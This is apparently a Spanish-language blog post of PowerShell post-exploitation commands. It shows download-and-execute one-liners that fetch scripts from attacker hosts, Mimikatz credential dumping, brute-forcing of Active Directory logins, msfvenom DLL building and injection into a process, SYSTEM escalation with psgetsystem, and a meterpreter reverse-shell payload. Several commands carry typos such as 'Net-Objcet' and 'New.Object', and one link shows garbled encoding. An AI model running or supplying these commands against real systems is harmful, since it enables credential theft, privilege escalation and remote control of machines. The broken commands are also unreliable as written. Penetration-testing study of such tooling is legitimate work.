---
title: 'Powershell post exploitation'
description: ''
pubDate: 'May 12 2023'
heroImage: '/asd.png'
slug: 'powershell/post_exploitation'
---

- ActiveDirectory
- Antak-WebShell
- Backdoors
- Bypass
- Client
- Escalation
- Execution
- Gather
- MITM
- Misc
- Pivot
- Prasadhak
- Scan
- Shells
- Utility

[Nisang](https://github.com/samratashok/nishang) adicionalmente nos trae lo mejor de otras herramientas.

```powershell
# Copia el registro hive y el SAM del directorio actual de trabajo
iex (Net-Objcet Net.Webclient).downloadstring("http://192.168.0.17:8080/script.ps1");Copy-VSS

```

Invoke-Mimikatz cmdlet va a dumpear los hashes de la memoria

```powershell
iex (New.Object Net.Webclient).downloadstring("http://192.168.0.17/Invoke-Mimikatz"); Invoke-Mimikatz -DumpCreds

```

#### Bruteforcing MSSQL, Directorio activo, web y ftp

```powershell
Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp\pass.txt -Service ActiveDirectory -StopOnSuccess -Verbose
```

#### DLL Injection - PowerSploit

```powershell
msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll
# lo pasamos a la windows con iex...
iex (Net-Object Net-client).DownloadFile("http://atack_url/cmd.dll", "C:\temp\cmd.dll")
# inyectamos nuestro dll a un proceso por ejemplo notepad, identificamos el PID
ps | ? {$_.ProcessName -match "notepad"}
# ahora lo inyecatamos descargando el dll e identificando el proceso
iex (New-Object Net.Webclient).DownloadString("http://atack_url/Invoke-DLLInjection.ps1");Invoke-DLLInjection -ProcessID 7413 C:\programdata\cmd.dll

[Explicaci√≥nDLL Injection](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)

```

#### Psgetsystem

Evadir apps de soluciones de lista blanca para injectar nosotros mismos a un proceso confiable

[psgetsystem script](https://github.com/decoder-it/psgetsystem)

```powershell
# descargado a nuestro target, lo source y executamos
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(<system_pid>, "<command_to_execute>")

# antes de hacer esto necesitamos identificar un proceso y elegimos uno que podamos utilizar
Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id
# nos da una lista de procesos system-owned justo con el PId y el nombre del proceso

# Ejecuta cmd.exe prompt pero como proceso hijo del system-owned processname.exe y como resultado nuestro proceso hijo tambien sera SYSTEM (NT authority/system)

. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(3385, "cmd.exe")

```

otra exelente herramienta [Empire](https://github.com/EmpireProject/Empire)

```bash
msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=192.168.0.55 -f psh-reflection > payload.ps1

```
